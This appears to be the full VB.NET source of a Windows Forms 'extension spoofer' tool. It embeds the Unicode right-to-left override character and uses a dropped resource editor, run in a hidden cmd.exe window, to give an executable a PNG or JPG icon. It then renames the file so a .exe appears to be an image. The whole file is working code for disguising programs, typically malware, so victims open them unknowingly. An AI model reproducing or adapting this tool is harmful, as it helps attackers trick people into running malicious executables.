Public Class Form1
    Dim rlo As String = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("4oCu"))
    Dim AppDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Dim ExeFile As String = Nothing

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
      
        ComboBox1.SelectedIndex = 0
        If Not IO.File.Exists(AppDataPath & "\res.exe") Then
            IO.File.WriteAllBytes(AppDataPath & "\res.exe", My.Resources.Res)
        End If

        If Not IO.File.Exists(AppDataPath & "\Png.ico") Then
            IO.File.WriteAllBytes(AppDataPath & "\Png.ico", My.Resources.Png)
        End If

        If Not IO.File.Exists(AppDataPath & "\Jpg.ico") Then
            IO.File.WriteAllBytes(AppDataPath & "\Jpg.ico", My.Resources.Jpg)
        End If

    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        'Delete temp files
        If IO.File.Exists(AppDataPath & "\res.exe") Then
            IO.File.Delete(AppDataPath & "\res.exe")
        End If
        If IO.File.Exists(AppDataPath & "\Png.ico") Then
            IO.File.Delete(AppDataPath & "\Png.ico")
        End If
        If IO.File.Exists(AppDataPath & "\Jpg.ico") Then
            IO.File.Delete(AppDataPath & "\Jpg.ico")
        End If
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If OpenFileDialog1.ShowDialog() = DialogResult.OK Then
            If CheckBox1.Checked = True Then
                IO.File.Copy(OpenFileDialog1.FileName, OpenFileDialog1.FileName & "_")
            End If

            If ComboBox1.Text = ".png" Then 'png
                ChangeIcon(OpenFileDialog1.FileName, AppDataPath & "\Png.ico")

            ElseIf ComboBox1.Text = ".jpg" Then 'jpg
                ChangeIcon(OpenFileDialog1.FileName, AppDataPath & "\Jpg.ico")

            End If
            System.Threading.Thread.Sleep(1000)
            IO.File.Move(OpenFileDialog1.FileName, IO.Path.GetDirectoryName(OpenFileDialog1.FileName) & "\" & Microsoft.VisualBasic.StrReverse("exe." & TextBox1.Text & ComboBox1.Text & rlo))

            MsgBox("Complete")
        End If

    End Sub

    Private Function ChangeIcon(ByVal AppPath As String, ByVal IconPath As String) As String
        Dim startInfo As New ProcessStartInfo
        startInfo.FileName = "cmd.exe"
        startInfo.Arguments = "/C " & AppDataPath & "\res.exe" & " -addoverwrite " & AppPath & ", " & AppPath & ", " & IconPath & ", ICONGROUP, MAINICON, 0"
        startInfo.WindowStyle = ProcessWindowStyle.Hidden
        Process.Start(startInfo)
        Return False
    End Function

End Class
